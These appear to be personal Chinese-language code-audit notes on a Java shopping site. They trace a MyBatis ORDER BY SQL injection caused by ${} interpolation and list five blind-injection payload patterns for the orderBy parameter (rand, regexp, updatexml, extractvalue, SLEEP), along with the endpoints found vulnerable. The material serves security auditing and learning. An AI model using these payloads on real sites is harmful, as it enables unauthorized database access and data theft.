通过查找的api product深入追踪，发现product_name并未进行过滤，但是采用的mybatis
定位mybatis，一直到
![[Pasted image 20250603220239.png]]
发现该功能没有问题，但是下面有个oederby。
orderby使用mybatis的话，这里传递过来的参数并没有直接用#作为值进行排序，用的$这样可以使用作为字段值
问题就在这里，如果没有进行过滤就可能存在在问题
orderby的话，如果预编译就把传进来的值作为数值进行了，sql中就不会把它当作字段进行排序。

登陆处
![[Pasted image 20250603222505.png]]
![[Pasted image 20250603222443.png]]



直接去看全部的mybatis配置的mapper文件
之发现存在ordervy的时候使用了%,这块等下再看一下咋回事就行，应该是有问题的，但是尝试出来
挺多接口的
这里返回信息只有错误请联系管理员，所以需要进行判断猜测


[java代码审计：tmall购物网站审计 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/348349.html)

orderby的利用方式不同，要这样就能实现出来了
①、使用rand函数结果显示排序方式不同

```
orderBy=rand(1=1)
orderBy=rand(1=2)
```

②、利用regexp（正则表达式）

```
orderBy=(select+1+regexp+if(1=1,1,0x00)) 正常
orderBy=(select+1+regexp+if(1=2,1,0x00)) 错误
```

③、利用updatexml（更新选定XML片段的内容）

```
orderBy=updatexml(1,if(1=1,1,user()),1) 正确
orderBy=updatexml(1,if(1=2,1,user()),1) 错误
```

④、利用extractvalue（从目标XML中返回包含所查询值的字符 串）

```
orderBy=extractvalue(1,if(1=1,1,user())) 正确
orderBy=extractvalue(1,if(1=2,1,user())) 错误
```

⑤、时间盲注

```
orderBy=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 
正常响应时间
orderBy=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 
sleep 2秒
```


通过直接定位orderby的mapper，反向找接口
存在问题的接口：
ProductMapper:
admin/product
admin/product/index/count
product
/product/index/count
guess/cid
product/pid
/

ProductOrderMapper
order/index/count
admin/order/index/count
admin/order

UserMapper
admin/user
admin/user/index/count

ReviewMapper
admin/reward/{index}/{count}
admin/reward/
reward/list/{index}/{count}





